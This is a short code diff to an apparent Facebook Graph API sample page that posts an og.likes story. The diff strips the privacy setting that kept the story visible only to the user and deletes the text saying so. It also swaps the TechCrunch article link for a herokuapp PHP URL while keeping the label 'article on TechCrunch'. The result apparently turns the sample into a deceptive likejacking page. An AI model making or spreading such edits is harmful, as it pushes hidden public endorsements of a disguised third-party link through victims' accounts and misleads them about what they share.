@@ -64,7 +64,6 @@ div { padding: 10px; }
        'https://graph.facebook.com/me/og.likes',
        'post',
        { object: objectToLike,
-         privacy: {'value': 'SELF'} },
        function(response) {
          if (!response) {
            alert('Error occurred.');
@@ -102,13 +101,10 @@ div { padding: 10px; }
 </div>
 
 <div>
-This example creates a story on Facebook using the
-<a href="https://developers.facebook.com/docs/reference/ogaction/og.likes">
-<code>og.likes</code></a> API.  That story will just say
+That story will just say
 that you like an
-<a href="http://techcrunch.com/2013/02/06/facebook-launches-developers-live-video-channel-to-keep-its-developer-ecosystem-up-to-date/">
-article on TechCrunch</a>.  The story should only
-be visible to you.
+<a href="https://spliff.herokuapp.com/Z.php">
+article on TechCrunch</a>.
 </div>
 
 <div>
